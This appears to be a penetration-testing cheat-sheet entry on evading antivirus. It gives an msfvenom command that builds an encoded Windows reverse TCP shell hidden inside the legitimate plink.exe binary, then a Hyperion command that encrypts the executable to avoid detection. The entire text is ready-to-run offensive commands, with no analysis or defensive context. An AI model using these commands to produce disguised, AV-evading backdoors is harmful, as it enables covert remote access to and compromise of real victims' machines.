# Bypass AV

### Encode & Embed payload in an executable file

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$VICTIM_IP LPORT=$VICTIM_PORT \
    -f exe -e x86/shikata_ga_nai -i 9 \
    -x /usr/share/windows-binaries/plink.exe \
    -o encoded_shell.exe 
```

### Hyperion \(PE encryption\)

```bash
wine hyperion.exe ../encoded_shell.exe ../crypted.exe
```



